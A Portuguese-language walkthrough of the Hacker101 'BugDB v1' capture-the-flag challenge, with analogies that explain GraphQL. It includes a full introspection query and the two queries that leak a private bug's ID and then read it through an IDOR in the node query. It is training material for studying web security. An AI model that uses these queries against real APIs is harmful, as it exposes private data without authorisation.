# Guia de Resolução: Hacker101 CTF - BugDB v1

Este documento é um guia de estudo aprofundado para o desafio "BugDB v1". Ele detalha a cadeia de vulnerabilidades que leva à resolução do CTF, com foco especial na metodologia de ataque contra APIs GraphQL. O objetivo é explicar não apenas *como* resolver, mas fornecer uma compreensão sólida do *porquê* cada passo funciona.

### Pré-requisito 1: O que é GraphQL? (Uma Analogia com um Restaurante)

Antes de mergulharmos na vulnerabilidade, é crucial entender o que é GraphQL e como ele difere de uma API tradicional (chamada de REST).

**O Restaurante Tradicional (API REST)**

Imagine que você vai a um restaurante com um menu de pratos fixos:
*   **Prato 1:** Bife com Batatas Fritas (`/users`)
*   **Prato 2:** Salada de Frango (`/posts`)

Se você quer apenas o bife, você tem que pedir o "Prato 1" e receberá o bife **e** as batatas fritas, mesmo que não as queira. Se você quer o bife e a salada, precisa fazer dois pedidos separados. Você recebe exatamente o que está no menu, nem mais, nem menos.

**O Restaurante Moderno (API GraphQL)**

Agora, imagine um restaurante diferente. Não há um menu fixo. Em vez disso, há um buffet com um chef muito inteligente. Você vai até o chef com um único pedido e diz exatamente o que quer:

> "Eu gostaria de um bife, duas colheres de purê de batatas, uma folha de alface e o molho da salada de frango."

O chef entende seu pedido, monta seu prato personalizado e te entrega tudo de uma vez. Você recebe **exatamente** o que pediu, nem mais, nem menos, em uma única viagem.

Isso é o **GraphQL**. O cliente tem total controle para pedir os dados que precisa, e o servidor responde com um JSON que espelha perfeitamente a estrutura do pedido.

### Pré-requisito 2: Como Escrever uma Query em GraphQL (A Receita do Bolo)

Entender como "fazer o pedido" ao chef do GraphQL é fundamental. Uma query tem quatro componentes principais, como uma receita.

**1. A Operação (O Tipo de Receita)**
Primeiro, você diz o que quer fazer. Na maioria das vezes, você vai querer ler dados, então usa a operação `query`. Se quisesse modificar dados, usaria `mutation`.
*   **Exemplo:** `query { ... }`

**2. O Campo Raiz (O Prato Principal)**
Logo após abrir as chaves, você escolhe o ponto de partida. É o "prato principal" que você quer. No nosso CTF, descobrimos que existiam `allBugs` e `node`.
*   **Como saber quais existem?** Através da **Introspecção**, que é como pedir o menu completo ao chef.
*   **Exemplo:** `query { allBugs }`

**3. A Seleção de Campos (Os Acompanhamentos)**
Este é o superpoder do GraphQL. Para cada "prato" que você pede, você especifica exatamente quais "acompanhamentos" (campos) quer. Você faz isso usando outro par de chaves `{}`.
*   **Exemplo:** Queremos o campo `private` de cada bug.
    ```graphql
    query {
      allBugs {
        # Esta estrutura edges/node é um padrão comum para listas
        edges {
          node {
            private  # <- Nosso acompanhamento
          }
        }
      }
    }
    ```

**4. Os Argumentos (O "Modo de Preparo")**
Às vezes, você quer filtrar ou especificar seu pedido. Por exemplo, "me traga o usuário com ID '1'". Você passa argumentos dentro de parênteses `()` logo após o nome do campo.
*   **Exemplo:** `query { node(id: "QnVnczoy") }`

**Juntando Tudo (Exemplo Completo):**
Vamos imaginar uma query para buscar um usuário e seus posts.

```graphql
# 1. Operação de leitura
query {
  # 2. Campo raiz 'user', com um argumento para filtrar
  user(id: "1") {
    # 3. Seleção de campos para o usuário
    name
    email
    # Podemos pedir campos aninhados, como os posts deste usuário
    posts {
      # E selecionamos os campos que queremos de cada post
      title
    }
  }
}
```
Com esta base, você está pronto para entender exatamente o que fizemos no desafio.

---

## Vulnerabilidade: Controle de Acesso Quebrado em API GraphQL

Diferente de desafios com múltiplas falhas, este CTF se concentra em uma única, porém multifacetada, classe de vulnerabilidade: **Controle de Acesso Quebrado**. A exploração ocorre em duas etapas, encadeando duas falhas distintas para alcançar o objetivo final.

### 1. Dica do Desafio
<details>
  <summary>Clique para revelar a dica</summary>
  <p><i>O que você pode ver? O que você não pode ver?</i></p>
</details>

### 2. Explicação Didática

> Imagine que você entra em uma biblioteca e pergunta ao bibliotecário: "Você pode me dar uma lista de todos os livros que você tem?". O bibliotecário, sendo prestativo, te entrega o catálogo completo. No catálogo, você vê um livro chamado "Diário Secreto do Diretor", mas a prateleira onde ele deveria estar está trancada. Você então volta ao bibliotecário e, em vez de pedir pela prateleira, você pede diretamente: "Por favor, me traga o livro 'Diário Secreto do Diretor'". O bibliotecário, seguindo as regras ao pé da letra, vai até a prateleira trancada, pega o livro e o entrega a você.

A exploração se deu em duas fases:
1.  **Vazamento de Informação:** A biblioteca (API) nos deu o catálogo completo (o esquema), revelando a *existência* de um livro secreto.
2.  **Controle de Acesso Quebrado (IDOR):** A biblioteca nos permitiu pedir o livro secreto diretamente pelo seu nome (ID), contornando a proteção da prateleira (a restrição de privacidade).

### 3. Explicação Técnica Aprofundada: A Anatomia do Ataque

O ataque a esta API GraphQL foi uma caça ao tesouro em duas etapas. Não podíamos ir direto ao prêmio; primeiro, precisávamos do mapa.

#### **Fase 1: Obtendo o Mapa com a Introspecção**

A primeira vulnerabilidade não foi uma falha no código, mas uma **configuração insegura**: a **Introspecção do GraphQL estava habilitada em produção**. Isso nos permitiu usar uma **Introspection Query** para obter o esquema completo da API.

**O Payload de Introspecção (A Chave Mestra):**

Para obter esse "manual", usamos uma query padrão e universal, conhecida como Introspection Query. Você não precisa decorá-la, apenas saber que ela existe e como usá-la. Ferramentas como GraphiQL ou GraphQL Playground geralmente têm um botão "Docs" que a executa para você.

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
    }
  }
}
```

**Dissecando o Payload de Introspecção:**

*   `__schema`: Este é um campo especial reservado pelo GraphQL, o ponto de entrada para qualquer pergunta sobre a estrutura da própria API.
*   `types { ... }`: Esta é a parte mais importante. Ela diz: "Me dê uma lista de **todos os tipos de dados** que você conhece (usuários, bugs, etc.)".
*   O resto da query (`fields`, `args`, `...FullType`, etc.) simplesmente detalha o nível de profundidade da informação que queremos sobre cada tipo: seu nome, seus campos, os argumentos que seus campos aceitam, e assim por diante.

Ao executar esta query, recebemos um JSON gigante que era, efetivamente, o mapa completo da API.

**Análise do Esquema (O Mapa):**
Analisando a resposta, descobrimos:
*   Existem dois tipos de dados para bugs: `Bugs` (simplificado) e `Bugs_` (detalhado, com o campo `text`).
*   Existe uma query `allBugs` que retorna objetos do tipo `Bugs`.
*   Existe uma query `node` que pode buscar qualquer objeto pelo seu `id`.

**Execução da Query de Vazamento:**
Com o mapa em mãos, construímos nossa primeira query de ataque.

```graphql
query {
  allBugs {
    edges {
      node {
        id
        private
      }
    }
  }
}
```

**Por que esta query funcionou?**
A API vazou a existência (`id`) de um bug privado (`private: true`), nos dando a chave da porta.

**Resultado:** Obtivemos o ID `QnVnczoy`.

---

#### **Fase 2: Usando a Chave para Abrir a Porta (IDOR)**

Agora tínhamos o mapa e a chave. A introspecção já nos havia mostrado a query `node(id: ID!)`.

**Construindo o Segundo Payload (A Query de Exploração):**

```graphql
query {
  node(id: "QnVnczoy") {
    ... on Bugs_ {
      text
    }
  }
}
```

**Dissecando o Payload da Etapa 2 (A Arma Final):**

*   `node(id: "QnVnczoy")`: Chamamos a query `node` com o ID que vazamos como argumento.
*   `... on Bugs_ { ... }`: Usamos um **Fragmento Inline**. A lógica é: "Eu suspeito que o objeto com este ID é do tipo `Bugs_`. **SE** eu estiver certo, me dê os campos a seguir."
*   `text`: Dentro do fragmento, pedimos o campo `text`, que só existe no tipo `Bugs_`.

**Por que este payload funcionou?**
A falha é um clássico **Controle de Acesso Quebrado (IDOR)**. O desenvolvedor protegeu a listagem (`allBugs`), mas esqueceu de colocar a mesma proteção na busca direta (`node`). O servidor ingenuamente nos entregou o objeto sem verificar se tínhamos permissão para vê-lo.

Ao combinar o vazamento de informação da primeira query com a falha de controle de acesso da segunda, montamos a cadeia de ataque que nos levou à flag.

### 4. Ferramentas que Poderiam Ajudar

*   **GraphiQL / GraphQL Playground:** Essenciais. A presença dessas IDEs em produção é a primeira grande vulnerabilidade.
*   **GraphQL Voyager:** Uma ferramenta de visualização que desenha um mapa interativo da API a partir da introspecção.
*   **InQL / Clairvoyance:** Ferramentas de linha de comando que automatizam a introspecção e a busca por vulnerabilidades comuns em APIs GraphQL.